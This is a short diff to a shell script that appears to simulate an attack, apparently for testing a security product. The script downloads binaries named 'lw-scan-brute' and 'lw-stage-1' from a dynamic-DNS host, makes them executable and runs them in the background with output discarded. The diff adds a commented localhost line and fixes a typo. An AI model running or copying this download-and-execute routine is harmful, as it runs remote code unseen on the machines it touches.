@@ -3,6 +3,7 @@
 
 #set constants
 HOST="lacework.ddns.net"
+#HOST="localhost:8080"
 SIM_1_BIN="lw-scan-brute"
 SIM_2_BIN="lw-stage-1"
 BIN_URL="http://${HOST}/bin/"
@@ -20,7 +21,7 @@ download_exec_binary() {
 	fi
 
 	#change permissions so it can be executed
-	echo "Changing permissins on $1 to allow execution..."
+	echo "Changing permissions on $1 to allow execution..."
 	chmod u+x $1
 	if [[ $? -eq 0 ]]
 	then
@@ -32,6 +33,7 @@ download_exec_binary() {
 	fi
 
 	#execute the binary
+#	./$1$2
 	echo "Executing $1..."
 	./$1$2 >/dev/null 2>&1 &
 	if [[ $? -eq 0 ]]
